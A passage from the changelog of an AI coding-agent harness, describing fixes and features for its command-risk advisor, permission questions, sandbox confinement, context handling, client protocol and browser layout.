  the same number and was lifted off green for it.

  The fix is in `contrib/laya_advisor.py`, which is the adapter and was behaving like a pipe.
  The two engines agree on the question shape and not on the answer: laya keys its answers by
  the primitive and sends no `type` at all, which the documented shape requires. So the shim now
  builds each answer from the question it asked - which is the authoritative source for the type
  - and computes confidence from the distribution, which is what the caller means by the word.
  `ls` comes back at 0.97 and is green.

  `--probe "<command>"` prints what laya answers verbatim beside what the shim makes of it;
  `--selftest` checks the translation against laya's own recorded answer for `ls` with no
  checkpoint needed, and `cargo test` runs it.


- **`examples/jev_assisted_compaction` runs on the key the advisor actually accepts.** It asked
  for `TYPESAFE_API_KEY` and built its own `Jev::latest`, while `--advise` and the advise suite
  both go through `endpoint::advise::connect`, which takes TypeSafe's key *or* `KAMCHATKA_API_KEY`
  and picks the endpoint and the model to match. So the one example about the advisor was the one
  thing a person with an OpenRouter key could not run. It goes through the same path now, and the
  line about what the advice cost names whoever answered rather than saying TypeSafe whoever did.

- **The chat in a browser follows the context again after a command has been typed.** A line
  handed in from the page is drawn at once and put on a list of lines waiting to become context
  items, which the `context.added` record then claims one at a time. A slash command never
  becomes an item, so every `/` anybody typed left an entry on that list for good - and the chat
  rebuild is held back while anything is on it, because a rebuild would take away a message that
  is not in any projection yet. So the chat stopped following the context from the first command
  of the session: an item edited afterwards read as it used to until the page was reloaded, which
  is what emptied the list. Only messages go on it now.

- **The on-screen keyboard stops landing on top of the prompt.** Two things were missing, one on
  each side of the problem. `interactive-widget=resizes-content` in the viewport meta asks the
  browser to shrink the *layout* viewport as well as the visual one, which is what makes ordinary
  flow put a footer above the keyboard rather than under it; the default, `resizes-visual`, leaves
  every viewport unit answering "the whole phone". Chrome 108+ and Firefox 132+ honour it, and
  Safari ignores it - iOS resizes neither the layout viewport nor `dvh`, which is why the script
  is still there.

  The script was reading only how *tall* the visual viewport is, and a keyboard also slides it
  down the layout viewport. `--lift` is how far, and without it the page came out the right
  height in the wrong place: measured on a 390×844 phone with a 336px keyboard and a 120px
  offset, the prompt sat at 508 with the visible part ending at 628, so the header was cut off
  the top and there was a strip of nothing under the prompt. It sits at 628 now.

  A keyboard also *animates*, and the first size a browser reports is measured part of the way
  through it - which is the prompt ending up under the keyboard by the difference. The fit is
  re-taken three times over half a second after a box takes the focus.

- **The advisor's rating reaches a browser, where it used to stop inside the process.** A build
  with `shell-advisor` in it, started with `--advise`, served a page exactly what a build without
  it served: the advisor ran, tightened the verdicts it was there to tighten, and the green,
  yellow or red band that is the whole point of the feature was drawn only by the terminal's own
  overlay. It travels beside the questions now, as `protocol::Attached::rated`, and the page draws
  the same three colours from it.

  The band is `Rated::shown` rather than the score, so a browser and a terminal cannot disagree
  about a command; the words come down the wire with it rather than being reworded at the other
  end; and the confidence goes beside it, because a yellow that means "this changes something" and
  a yellow that means "nobody could tell" are not the same warning.

- **A piped `--connect` left the question it raised unanswered, and the session waiting on it.** A
  turn paused on a permission question is not running, so the session reports `busy: false` while
  the kernel sits in `Deciding` - and the client read that as the end of the turn. `printf 'run
  ls\n' | kamchatka --connect` printed the question, detached, and exited `0` after two seconds,
  leaving a served session blocked on an answer that could no longer come from anywhere for as long
  as the process lived. From the other end it read as the client freezing mid-turn.

  A question is not rest, so the client waits for one; and once its input has closed there is
  nobody left to ask, so it answers what is still open itself and says which question it answered
  and how. That is `--on-ask`, the same flag and the same two words `--headless` has always taken,
  and it defaults to `deny` for the reason it does there: a run nobody is watching should not be
  able to do a thing nobody allowed. It is the one argument `--connect` now takes beside the
  address, because it is the one that is not a fact about somebody else's session.

- **One oversized record locked every client out of a session for good.** `context.replaced` is
  the only event that carries content, nothing caps what a session writes into its log, and a
  client resumes by sequence - so a rewritten tool result over `protocol::MAX_LINE` was refused by
  every client, on every attempt, for the rest of the session. It came back to the same record,
  retried for a minute and left.

  A record over the cap now goes out as `Message::Oversized`, carrying its sequence and how many
  bytes it would have been. The client takes that sequence as seen and carries on, so what it has
  is a hole it knows the size and position of rather than a closed connection; `Command::Inspect`
  is where the content is when somebody wants it, which is already how content is fetched on
  demand. Raising the number was never the fix - it moves the size of the thing that breaks.

  Writing the test for it found the other door, which is not closed: a context item that is large
  *now* makes the projection itself too long, and a projection cannot be skipped. `POSTPONED.md`
  has it.

- **A client's command stopped the session hearing its own kernel.** `Server::run` applies a
  command inside its own `select!`, so while `/models` waited on an endpoint that had gone quiet
  the loop read nothing from the kernel's broadcast - and that channel drops what nobody took. What
  this loop reads it for is `App::trace`, which `Attached::trace` hands to every client that
  attaches afterwards, so one slow command gave everybody who arrived later a trace full of holes
  and nothing anywhere said so. Both loops that can serve a session - the one with a socket and the
  one that also draws - now read the stream while they wait.

  Only the events, which is the answer to a longer version of this. A connection waits in the
  listen backlog, an outcome in an unbounded channel and a `ctrl+c` in its own stream: all of them
  arrive late either way and none is dropped. What is still true is that one client's command is
  answered before the next one is, because answering anybody needs the session and there is one of
  it; `RUNNING.md` says so where somebody running `--serve` will read it.

- **Text a terminal draws two cells wide was measured as one.** Everything deciding what fits -
  `refit`, `fold`, `split_to_fit`, `clip`, `markdown`'s `fit` and the context pane's label
  column - counted characters, and a terminal counts columns. So a row of CJK, of fullwidth Latin
  or of emoji was built twice as wide as the pane it was built for, and a `Paragraph` that does
  not wrap drops the right-hand end of a row like that. The dropped end is not reachable by
  scrolling either: it was never put in a row to scroll to. An answer, a code block and the
  arguments in a permission question were each losing about half of themselves.

  Every measurement now goes through `ui::text::columns`, and splitting moved to grapheme
  clusters with it, because half of a wide character is not a character and an `é` written as a
  letter and a combining accent is two characters in one cell. The clip counts the ellipsis as
  the column it occupies, so what comes back is never wider than what was asked for - and where a
  box has no room for one grapheme and an ellipsis both, the ellipsis wins, since a reader can act
  on *something was cut* and cannot act on one character of what.

  The other half is padding, and `{:<width$}` has no idea what a column is: a label of eight wide
  characters in a column eight wide was given no padding and took sixteen cells, which pushed
  every column after it along and dropped the last one off the row. `ui::text::pad` builds those
  cells instead, and the context pane and the permissions pane use it.

- **A model change reached nobody.** `/model` and `/provider` finish inside the `Dialect` the kernel
  already holds rather than by replacing the kernel's provider, so the slot never changes,
  `model.changed` is never emitted, and the switch is in no record. Every projection was right,
  because it asks the provider; nothing between two projections was. A browser's header went on
  naming the model it attached with, and a second client was never told at all.

  `Message::Model` is the fix and it is the rule `Message::Busy` already states: on the wire because
  it cannot be worked out from the records, broadcast on a change because the program has one voice.
  The page reads the header from all three places it can learn one now - the projection it attached
  with, a fresh projection, and this - where it only ever read the first. Making it a *record*
  instead is where it belongs and is in `POSTPONED.md`.

- **`busy: false` could overtake the answer it was about**, so a client with its input closed left
  without it. `Message::Busy` is how a client learns a turn is over and `kamchatka --connect` with
  a question piped into it leaves when it is told the session has nothing left to do - but the
  connection wrote the voice and the kernel's events from two arms of one `select!`, and nothing
  said which went first. A `busy: false` that won the toss said the turn was done while the
  fragments of it were still queued.

  The records could not stand in for them, which is what makes it the answer that goes missing
  rather than a detail: the log names what happened and does not copy it, so `context.added` says
  an assistant turn exists and not one word of what it said. What the model *said* reaches a client
  as `Message::Progress` and nowhere else. Anything already emitted is now written before any
  message from the voice, numbered and not - the rule the event arm already followed for the
  records, applied to the pair of them.

  It was about one run in seven, on every platform. What found it was
  `the_program_serves_a_socket_and_a_second_one_drives_it` failing on macOS CI, and that test is
  the one that covers it: the session was never wrong - it recorded the answer and ended the turn -
  and neither was the client, which left when it was told there was nothing left to wait for.

- **A connection closed on a peer that is still sending may lose the last thing it was told**, and
  the test for the oversized frame was written as though it could not. The session says why and
  closes; the peer is mid-flood, so the receive buffer holds bytes nobody read, and TCP answers a
  close like that with a reset - which on Windows discards what the peer had already been sent, the
  sentence among it. Draining first would deliver it and is exactly what `MAX_LINE` refuses to do,
  since not reading a peer that floods is the whole point. So the promise is that the connection
  ends rather than that it is told why, which is now what the test asks and what `serve` says.

- **A test helper's import broke the Windows build.** `tests/common`'s `endpoint` is `#[cfg(unix)]`
  - it wants a socket a child process can be pointed at - and the `Arc` it uses was imported at the
  top of the file, where on Windows nothing reaches it. Under the `RUSTFLAGS` this workspace builds
  with that is a failed build, on the one platform nobody here runs and the suite is compiled into
  three ways. The imports are the function's now, beside the ones it already had of its own.

- **The on-screen keyboard covered the prompt.** The page is `height: 100dvh`, and `dvh` is the
  viewport a URL bar grows and shrinks rather than the one a keyboard does - the layout viewport
  does not move when a keyboard opens, so the footer sat underneath it and the box was unreachable
  on the one device this page is for. It reads `window.visualViewport` now and sets the height from
  that, keeping `100dvh` as the fallback where there is no such thing. A log that was scrolled to
  the end stays there across the resize, since a shorter log otherwise keeps the offset it had and
  the last line somebody was reading scrolls away as they tap the box.

  Three more places were measuring the wrong viewport or the wrong thing, and any of them puts the
  box back under the keyboard on its own. The prompt's ceiling was `30vh` in the stylesheet and
  `innerHeight * 0.3` in the script, both of which are the layout viewport - so a box allowed to
  grow to a third of the whole phone grew inside a third of a phone's worth of room; it is a third
  of what is *visible* now, and scrolls inside itself past that. The log needed `min-height: 0`,
  because a flex item does not shrink below its content without it and the log is the one thing
  here that must: room for a growing box comes out of the conversation, never out of the half of
  the page somebody is touching. And the page puts itself back to the top on every resize, because
  a browser bringing a focused box into view scrolls the *layout* viewport - the one that did not
  change - which walks the header off the top and everything under it back down behind the
  keyboard.

- **The header wrapped, and a second row pushed the page down.** A long model name - or a word
  beside it - took the bar to two lines, which moved the chat and the prompt every time the session
  was reconnecting or working. It is one row that never wraps: the model's name ellipsizes, because
  it is the one thing on the row whose length nobody can predict, and the figures and the view
  button keep their places.

- **A client arriving filled the conversation.** `client N attached` and `client N left` were said
  through `App::say`, which puts them in `App::loose` - the conversation, which is in every
  projection handed out afterwards. A browser reconnecting on a flaky link opens a connection a
  second, and `examples/browser.html` asks for exactly that with `retry: 1000`, so the chat filled
  with arrivals until somebody typed `/cleanup`. They are trace lines now, `client.attached` and
  `client.left`, which is the ring a thing that happens once a second belongs in. Nothing is lost:
  `Attached::trace` carries them, so they are rows on the events tab of every client.

- **`/help` described a terminal to callers that have none.** Six of its seven pages are key
  bindings for tabs - `ctrl+p` shows the next request, `g` goes to the top of the trace - and both
  a run down a pipe and a browser on a phone were handed all of them, under the title `the keys`.
  What is left for a reader with no keys is the slash commands, which everybody can type, and that
  is what `/help` gives them now. `help::Section` says per section whether it is about keys, rather
  than the answer being worked out from a name; the loops that have none - `headless.rs` and
  `remote::Server::run` - set `App::keys` themselves, so an embedder driving either gets the same
  thing the program does.

  The headless test for this asserted the opposite and had a reason: a caller handed one page of
  six cannot press `←` for the other five. That was the right answer to the wrong question, and the
  browser is what made the question visible.

- **A page showed one answer twice, and another in two pieces around a typed message.** One
  cause: `examples/browser.html` took fragments that arrived *after* the record ending the answer
  they belonged to, and started a fresh bubble for them underneath whatever had been drawn since. A
  fragment is unnumbered and best-effort while the records are read out of the log and never
  dropped, so a connection that falls behind is caught up on records first and handed the fragments
  it was holding afterwards - which `server.rs` documents, and which the terminal has always
  handled by dropping them once the item exists (`Entry::transient`). The page does now.

  A phone is what made it happen: slow enough to stall the gateway's writes back through the
  session's connection task until it lagged its own subscription. That is the backpressure design
  working exactly as written, with the consequence it says it has.

- **A page drew a message it had sent twice.** `examples/browser.html` renders a line the moment it
  is sent - it has to, because a message handed into a running turn is queued and would otherwise
  be invisible until that turn ended - and then drew it again when `context.added` arrived, because
  the rule for "an item whose words this page has not got" caught its own. It binds the line it
  drew to the item it turns out to be, from whichever of `replied` and `context.added` arrives
  first.

- **A served session greeted every client with the terminal's keyboard shortcuts.** `ctrl+p` shows
  the next request and `F1` lists the keys - said once into the conversation, and therefore into
  every projection every client has been handed since, including a browser with none of those keys
  to press. The condition guarding it asked whether the run was headless, which was the right
  question when there were two loops and a third answer to neither once there were three. Found by
  opening the page.

- **A question answered before the turn that raised it had finished unwinding stopped the session
  for good.** `permission.requested` is broadcast while that turn is still in flight, so an answer
  inside the window was recorded, found `start_turn` refusing because the old turn was still marked
  as running, and was followed by an outcome saying `Deciding` with nothing left to decide. Every
  question answered, no turn running, and nothing that would ever start one. `headless.rs` stays
  out of the window by only answering while the kernel rests; the keys and a socket cannot, because
  a person answers when they answer - so it is closed in `App::on_outcome`, where all three come
  through.

- **A question the `a` sweep let through was decided rather than answered.** `App::decide` answers
  the one somebody looked at through `App::answer`, and then swept the questions queued behind it
  straight into `Kernel::decide` - which is every step of an answer except the one that tells the
  sandbox. A `curl` allowed by a promise about what happens next therefore ran with TCP cut, while
  the record said allowed and nothing named the confinement as the reason. Both go through
  `App::answer` now.

  What reaches the sweep is narrower than it looks: `a` on an `ls` remembers `exec:run` and leaves
  `net:reach` where it was, so a `curl` behind it is still a question and is never swept. It takes
  two calls whose every subject the first answer covered.

- **A resume was the one command a client sent that was answered with nothing.** `Message::Done`
  states the invariant - every command a client sends gets exactly one answer - and `attach` with a
  watermark was the exception: the records after it, and nothing else. `Client::say_to` counts
  every command as owed one, so a client that survived a blip was owed an answer for ever and
  `Client::resting` was false for the rest of the process. Neither of the two things that wait on
  it worked after that: stdin closing no longer detached, and nor did the session going quiet.
  `printf 'a question\n' | kamchatka --connect` over a link that blipped hung instead of leaving
  with the answer.

  A resume is answered with a `done` now, and it carries `busy` - the other thing a reconnecting
  client cannot work out for itself, because a turn may have ended while it was away and no record
  says so. The count is reset per connection as well, for the case the session cannot help with: a
  command in flight when the socket died is owed an answer nobody is going to send, and the session
  never saw it.

- **`--connect`'s `ctrl+c` had one stage, and three places said it had two.** It wrote an
  `interrupt`, printed `asked it to stop; what has arrived is kept, and again detaches`, and then
  did exactly the same thing the next time - and `tokio::signal::ctrl_c` does not put the default
  handler back after the first delivery, so the process would not leave on its own either. It has
  the second stage now, the one `--headless` and the server already carry: the first is for the
  turn, the second detaches, and the session carries on without it. The flag is the connection's
  rather than the client's, so a socket that dropped and came back is a fresh pair of stages -
  otherwise a `ctrl+c` pressed an hour ago detaches somebody from the middle of a turn they are
  watching now.

- **Every attach printed `client N attached` twice.** A connection's subscription to the program's
  own voice was taken when the socket arrived, which is after that line is said and before it is
  broadcast - while the projection carrying the conversation is taken later still, when the
  `attach` reaches the session loop. So the line was in `attached.conversation` and arrived again
  as a `said`, on every attach there has ever been, in `--connect` and in the browser both.
  `Attached::seq` makes the airtight version of this argument about the records; the voice stream
  had the opposite overlap and nothing said so.

  The subscription is taken where the projection is, in the session loop, with nothing in between.
  On a re-attach it is swapped exactly when a fresh projection is handed over: a resume is answered
  with no projection, and the subscription it already has is holding lines nothing else would bring
  back.

## [0.13.0] - 2026-09-19

### added

- `--advise` borrows `KAMCHATKA_API_KEY` where no dedicated key is set **and the session's own
  requests already go to OpenRouter**. `jev` is served there as well as by TypeSafe, so in that one
  configuration the key already paying for the conversation can pay for the questions too, and a
  session that was not given a second key is no longer a session that cannot have an advisor.
  `KAMCHATKA_TYPESAFE_API_KEY` is still checked first, so a session holding both pays TypeSafe.

  The condition is the whole of what makes it safe, because a key is an OpenRouter key by virtue of
  being sent to OpenRouter and not by virtue of the variable it was read from. A session pointed at
  ollama, at Google with `--gemini`, or at a gateway of somebody's own holds a key that service
  issued, and spending it here would hand a third party a credential with no business with them -
  which is what the old refusal to fall back was protecting, pointing the other way. Those sessions
  are refused, and told which address the refusal was about rather than being told they need a key
  while holding one.

  What the fallback does widen is who is told: the arguments `--advise` already sends off the
  machine go to OpenRouter as well as to the model behind it, which is why it is in `--help` beside
  the variable rather than left to the readme.

  The endpoint and the model follow from whichever key was found rather than being read
  independently, since three settings that can disagree are three ways to send a key to a service
  it is not for. `KAMCHATKA_TYPESAFE_BASE_URL` and `KAMCHATKA_TYPESAFE_MODEL` still override each,
  and pointing one at the other service means setting the other too.

- Feature `assisted-shell`, which has the advisor place each command a question is about on a
  three-level rubric - it only looks; it changes something that could be put back; it destroys
  something that cannot be got back or sends something off this machine - and draws that in the
  question in green, yellow or red. It is on top of `advise` rather than beside it and needs
  `--advise` at runtime as well. The line sits in the header, above the arguments and inside the
  region that does not scroll, because a warning that can be paged out of sight is one nobody has
  to have seen; the confidence is printed beside it, since a band is not a fact about the command.
- The rating **decides nothing**: it is never folded into a verdict, so a session with the feature
  on refuses and allows exactly what the same session without it does. Two rules keep it honest in
  the other direction. A score is read by the level it is nearest rather than the one it has
  passed, so a command mostly on the top level is drawn as being on it; and a rating the advisor
  was not sure of is never drawn in green and never drawn safer than it scored, on the grounds
  that a distribution spread across a safety rubric is the advisor saying it could not tell, which
  is not the same as saying a command is safe.
- What it costs is a wider disclosure than `advise` alone, which is why it is a second opt-in and
  not part of the first. `advise` sends a call's arguments only where the standing rules were
  going to *allow* it - in a default session, not one command, since `exec:run` is a question. A
  rating is asked for where they were going to *ask*, which is every command the model writes. A
  call heading for a refusal is still sent nowhere: it has no question to colour, and rating one
  would hand over the arguments of a call that was never going to run.

### fixed

- `u` and `U` work on a context pane a filter has emptied, which is where they are most needed.
  The keys that pick a row need one, so the handler returned early with nothing listed and took
  those two with it: with `f` on, hiding the last row on the screen removed the row and the key
  that would put it back, and the way out - press `f` first - is written nowhere.
- The four tab shortcuts reach past an open search box. The box takes the keys while it is open
  and read every character without `ctrl` as one of its own, `alt` included - so `alt+2` typed a
  `2` into the query instead of going to the context tab, which `/help` promises it does
  everywhere. The handler's own note said a modifier means somebody reaching past the box.
- The context header counts what `f` is holding back rather than what a search is also hiding. The
  figure was every row the list dropped, which with a query running is the two filters together,
  under a label naming `f` as the reason - so items going into the request were reported as not
  being sent. The empty pane has a note about not making that claim; this was the same claim one
  branch further on.
- A pipe inside a table cell stays inside it. Every pipe was read as a column boundary and every
  pipe was trimmed off both ends, so `\|` moved each value after it one column left and the row
  was then cut to the header's width, dropping whatever fell off - and a row opening with an empty
  cell lost it. A table drawn from an answer has to say what the answer said.
- A long trace detail wraps instead of running off the right edge. It was wrapped against the whole
  pane and then had the clock and the name column put in front of it, which is the one pane whose
  promise is that a detail wraps rather than being cut.
- `setup tools` says whether what is cut is kept, rather than promising it always is. `policy`
  reads that setting and this stated the opposite, so a session run `--forget-truncated` got two
  answers from one tool two actions apart - and the one it was likelier to read sends a model
  looking for content the session was told to drop.
- `setup tools` says what cuts a tool that has no row in the limits table. Those are keyed by
  subject and a tool from a server declares none of them, so a session offering nothing else read
  `Nothing here cuts an answer short` while the kernel cut every one of them at its own ceiling.
- A settings file is answered before an endpoint is reached. `Setup::check` is what `wire` asks
  first and what `main` asks before it builds a provider, so a file naming `contxt`, or a path rule
  nothing can match, stops the program by name rather than after a round trip - or, with no API key
  anywhere, rather than being reported as a missing key.
- A second message sent into one running turn says that it replaces the first. The slot holds one
  and the newest wins, which is a decision - being silent about it is not, since the waiting
  message is drawn at the end of the conversation, so the second took that row away and put its
  own there with nothing said. `up` reaches what is waiting, never what it replaced.
- `/step` with a message, typed into a running turn, puts nothing into the context. The text was
  pushed before anything had said whether it could step, so it landed in a turn already running -
  the shape a plain message is held back from, because an item between a call and its result is
  one most of these APIs refuse - and the step was then declined in silence.
- `log`'s `take` counts records, which is what it says it counts. It counted rendered lines, and
  `whole` prints a replaced item's old text entire - so `take: 1` against a record holding three
  lines of it handed back the last of those lines, with no sequence number and no event name in
  front of it, under a header calling that one record.
- `fork` and `setup` refuse an argument the action they name does not read, which the other tools
  have done since the last release. `without` belongs to `ask`, so a `draft` carrying one bought a
  request whose answer read as the experiment the caller asked for and was not one - an ablation
  nobody performed is read as evidence. `shell` asks the same question now, from the same table its
  schema is built from.
- A fork counts the caller's items rather than its own. The count was taken after this tool pushes
  the copy's system instruction, and after `ask` pushes the question, so the figure moved with
  which operation asked for it - and it is there to be compared between runs.
- `setup permissions` says what an undecided rule means, which is not the same for the two kinds.
  One sentence said both stop and ask "whatever the rows above say": true of a server, which is
  consulted beside the rows, and false of a domain, which an exact rule answers for. A model told
  that a read it is allowed will stop does not try it.
- A fork that was given no `without` says nothing of the caller's was taken away, rather than that
  the copy saw everything. The projector repairs the unfinished call out of the copy, so the
  stronger sentence was not true; what the line is for is telling an ablation from a question that
  merely asks the copy to disregard something.
- An `undo` does not walk back over a decision the person has made since. Every other move in
  `context` asks whether an item is theirs to move - a system instruction, a pin they put on - and
  this one went straight to the kernel, so a pin made after the model elided an item came off again
  on the model's next `undo`. Silently, and against the one thing the word promises. What it leaves
  alone is named in the answer.
- Walking a move back is one undo for the person, however many items the move named. It set each
  item's state in a call of its own, so undoing what this tool reported as one change left three
  checkpoints on their stack; the items are grouped by the state they return to. The report names
  each of those states rather than the first one for all of them.
- `ids` refuses a number that is not an item number, and reads the same number twice as one item.
  It dropped whatever it could not read, so `[-1]` arrived as no items at all - which is how a call
  naming none arrives - and `search` with one bad number searched the whole context. The refusal
  for naming items twice reads `ids` and `select` as *given* now, rather than as what they came to:
  a call with both, one of which parsed to nothing, was going through as the other one.
- `steps` outside what a walk takes is refused rather than rounded into range. It was clamped, so
  `steps: 0` walked one change back, a word walked one back, and a hundred walked sixty-four - and
  the schema advertised none of it. It says `from 1 to 64` now.
- The way back from an elision is spelled the way it is sent. The line said `state: "restore"`, from
  when the four moves were one argument with a `state`; they are four actions, and an argument
  nothing reads is refused by name - so a model following the instruction spent the call the
  instruction exists to save.
- An `edit` whose `old` names two places changes neither and says how many it named. The argument
  asks for enough of the surrounding lines to make it the only match and nothing checked, so the
  first was replaced, the second stayed, and the answer read `replaced one occurrence` - which is
  true of the file and reads as the edit being done. That is the half nobody goes back for: a model
  told its change landed does not read the file again. An empty `old` is refused with them, having
  named position zero and put `new` at the front of the file.
- `glob` looks at the file the call named, the way `grep` and `read` do. The policy is asked about
  the path in the call - `.env*` matched it, somebody answered - and the walk then skipped that
  same file and reported it as one a path rule says to ask about. An answer contradicting the
  permission just given is worse than either half of it.
- The two numbers in a search's answer add up. `N file(s) searched` counted a file before the
  search rather than after, so one that would not open or turned out to be binary was reported as
  read through *and* as skipped, and a model adding up a null result got a walk that does not
  reconcile.
- A walk stopped after the two hundredth path says it handed over the first two hundred. It said
  how many it had found and listed the cap's worth, with nothing accounting for the difference.

- Every answer in a batch stands until its call has run. A one-off `yes` to a command that reaches
  the network is permission for that call, and the grants were held sixty-four at a time with the
  oldest dropped - on the reasoning that one turn cannot produce more, which is an assumption about
  a model rather than something this program holds to. Every call in a batch is decided before any
  of them runs, so the sixty-fifth `yes` in one response threw away the first, and that command ran
  with the network cut after somebody had allowed it. They are kept for the batch and emptied at
  the next request, which is the one moment nothing can still be waiting for one.
- A path rule that cannot match is refused where it is entered, rather than drawn on the
  permissions tab as a rule. A rule is a file name in which `*` stands for any run of characters,
  or one directory name with a slash after it; `--allow 'src/**'` reads like the glob `fs` takes,
  is not one, and was compared with file names, which hold no `/`. RUNNING.md offered that as the
  example of a path rule. The refusal names the rule and the grammar, and a `*` before the slash
  goes with it - `secrets*/` is somebody expecting `secrets-old/` to be covered.

- A confined command that could not be confined is not run. The child process is asked to hold
  itself down and then run the command, and it ran it whatever came of the first half - unconfined,
  with the whole filesystem and the network, and with nothing saying so. What the permissions tab
  draws is the startup probe, which is a different call in a different process: `main` only hands
  `shell` a confiner where that probe held, and `Setup` is public, so this is the half that makes
  the guarantee the child's rather than the caller's. It says what happened and leaves with 126.
- `shell` says when the working directory is read-only, which is what a refused `fs:write` makes
  it. `Sandbox::note_for` deliberately says nothing about a refusal naming a path the session
  reaches - such a refusal is the file's own permissions - and that is wrong exactly when the
  session may not write: every write inside the working directory is then the boundary, worded the
  same way. Standard error does not say whether a refusal was a read or a write, so the sentence
  that can be certain is the one in the description, before anything runs.

### changed

- **`provider` is `endpoint`.** `provider::connect`, `provider::gemini::connect`,
  `provider::advise::connect`, `provider::api_key`, `provider::base_url` and
  `provider::configured_limit` are `endpoint::` now. The module holds no provider and has not
  since the dialects became `nachalnik-providers`: what is in it is the four environment variables
  this program reads and the functions that turn them into a connected client. A module called
  `provider` beside a crate of providers reads as the place one is implemented.
- `--deadline` says what it cannot cut short: a command of the operator's own that is waiting on
  the endpoint. `/models` fetches a list, and `/model` and `/provider` finish their switch, inside
  the branch that read the line - so the deadline and `ctrl+c` branches are unreachable until it
  answers. RUNNING.md said it was the one that needs nobody's cooperation; POSTPONED.md says what
  closing it would take and why a `timeout_at` around `App::submit` is not it.
- The note on `confine` no longer says a path that cannot be opened makes `add_rules` fail.
  `landlock`'s `path_beneath_rules` drops such a path and builds the rest, so a `--sandbox-allow`
  directory that has gone away costs its own rule and nothing else; `tests/sandbox.rs` holds the
  dependency to it, that being a fact about somebody else's crate.
- `fs` says the walks obey `.gitignore` and stay out of `.git` without counting either. It said
  they "count what they passed over", and those two are passed over silently - a model told that
  sentence and handed an answer with no skip line concludes nothing was left out.
- The note on `Careful::judges` says what it does about somebody else's tool: a `call` object is
  read through whoever's tool it belongs to, so a foreign argument of that name has its `path` read
  as a path. It can only add a subject, which asks a question nobody needed, where passing it over
  would be a rule that stops being one. Documentation only.
- A `shell` question draws the command as code, with its own joints picked out: the rule down the
  left that a fenced block already gets, its tokens in the same colours, and the `|`, `||`, `&&`
  and `;` that join one stage to the next coloured, because they are what somebody scanning the
  command is looking for. Wrapped as prose it was folded wherever the space ran out and the
  continuation went back to the margin, so the second half of a pipeline sat under `cmd:` looking
  exactly like the next argument, on the one screen whose whole job is saying what is about to
  run; and it wraps at a space rather than cutting mid-word the way a block of code does, since a
  command is one logical line and `cargo build` arriving as `carg` and `o build` helps nobody.
- The joints are read off the command rather than off the highlighter, which is the free option
  and is wrong twice over: `synoptic`'s `sh` mode calls every flag's hyphen an operator - `-n`,
  `-u`, `-5` - and does not tokenise `|` or `;` at all. The reading is quote-aware and declines
  rather than guessing: a separator inside a quote, inside `$(…)` or inside backticks is not a
  joint and is not coloured as one, and an unterminated quote, an unclosed `$(` or a trailing
  backslash means nothing is picked out at all - the panel will not tell somebody a quoted `|` is
  a pipe on the screen where they decide whether to run it. A command that brought its own
  newlines, a heredoc most often, gets the rule and the colours and nothing picked out, because
  what is inside a heredoc is arbitrary text.

## [0.12.0] - 2026-09-17

### added

- `/compact`, which asks the compactor by hand and shows its answer before applying it: every item
  it would take, with the identifier, what it is and what it is holding, and then `y` or `n`. The
  question stands in the prompt's place like a tool's and is pinned rather than modal, so the
  context tab is a keystroke away while it waits and `p` there keeps a row out of the pass. Saying
  yes works the pass out again rather than applying the list that was shown, so a pin made while
  reading it is honoured rather than refused after the fact.

  It is also the only way out of a context too big to send. `context` is the model's own tool and
  reaching it costs a request - the request that is failing - so until now a session that had run
  out of room could only be pruned by hand, item by item.

  `--headless` prints the list and takes it, there being no key to press down a pipe. The opposite
  of what `--on-ask` does with a tool's question, because they are different questions: a tool's is
  the model asking to do something nobody vouched for, and this one is a line the operator typed.
- The context tab says how far over the limit the next request is, when it is over. The corner
  turns red and says the compactor runs first, and has no room for the figure that decides what to
  do next; the difference between "over" and "over by two thousand" is the difference between
  reading forty rows and taking one of them out.
- `grep` answers with the files its matches were in when the lines will not fit, rather than with
  the first few thousand bytes of them. A capped lines answer is filled from wherever the walk
  started and says so, which is why it already advised `files_only`; this takes that advice rather
  than printing it. The saving is the shape that prompted it: four broad searches in one turn, each
  capped at a hundred matches and each still filling its byte limit with context lines, put forty
  thousand tokens into a context in one step.
- A request the model refused for its length says what that length was and how much of it has to
  go. The sentence above it is the server's, and every vendor writes those two numbers in a
  different order; this says what they mean here. It matters because the only other figure in
  front of somebody at that point is the corner, which is the estimate that has just turned out to
  be wrong - and which the same refusal is correcting.

  A request refused *here* gets its own sentence, because it is a different fact. The endpoint's
  is the model's own tokenizer reporting on a request it read; this one is an estimate of a
  request nobody has seen, made by the counter whose being wrong is the reason any of this exists,
  and it says so. "The model read that request as" a number the model was never shown is the kind
  of confident wrong sentence this corner of the program exists to stop.
- `--send-oversized`, and `send-oversized` in a settings file: send a request that looks too long
  for the model anyway, and let the endpoint be the one that says no. Both halves of that check
  can be wrong - the figure is an estimate and the limit is whatever the endpoint advertised.
  `liquid/lfm-2.5-2.6b` is quoted at 65,536 tokens on OpenRouter and routes to a provider whose
  own window is twice that, so a session holding itself to the smaller number refuses requests
  that would have been answered. The flag costs a round trip and buys the endpoint's own count of
  the request, which is worth more than any guess made here.
- `X-OpenRouter-Categories: cli-agent,programming-app` beside the referer and title, which is what
  puts an app in the [marketplace](https://openrouter.ai/apps) rather than only in the rankings.
  Sent only to OpenRouter; `KAMCHATKA_NO_ATTRIBUTION` turns all attribution off. An unrecognised
  category is dropped silently by OpenRouter, so nothing here checks the spelling.

- <kbd>y</kbd> on the context tab, and `/copy [N]`, which hand what an item says to the terminal
  for its clipboard. A screen is a rectangle and a selection over one is a rectangle too, so a
  mouse dragged across the chat pane takes the frame down both sides of every line with it, the
  wrapping of whatever width the window was, and none of what has scrolled past - and getting a
  model's answer out of here meant deleting a `│` from the front and the back of forty lines. This
  is the answer as the context holds it, unwrapped and whole. `/copy` with nothing after it is the
  last thing the model said, which is the one people are usually reaching for, and a command as
  well as a key because on the chat tab a bare `y` is a `y` typed into a message.

  It is OSC 52, an escape sequence rather than a dependency, so it works over `ssh` - the terminal
  at the far end is the one holding the clipboard. What it cannot do is find out whether it
  worked: there is no reply, and a terminal that does not implement it drops it silently. So the
  line says what it did rather than that the clipboard now holds it, and the byte count is the
  receipt. `App::clipboard` is the seam: the app sets the text, the loop that owns a terminal
  writes the sequence, and an embedder gets the text to do its own thing with.
- `context` with `look` takes a `select`, which lists the items a class comes to without moving
  any of them. Until now the selector grammar could only be resolved by using it: `elide` with
  `select: "tool:shell"` said what it had taken after taking it. The listing carries what that
  class is sending and holding against what the whole request carries, and marks the items a move
  would refuse - the person's pins, a system instruction, the turn being spoken in - off the same
  function the move consults, so the preview and the move cannot come apart. 483 bytes a request.

### fixed

- `ids` and `select` in one call are refused rather than half done. `select` won and `ids` was
  dropped without a word, so `elide` with both moved whatever the selector matched and reported
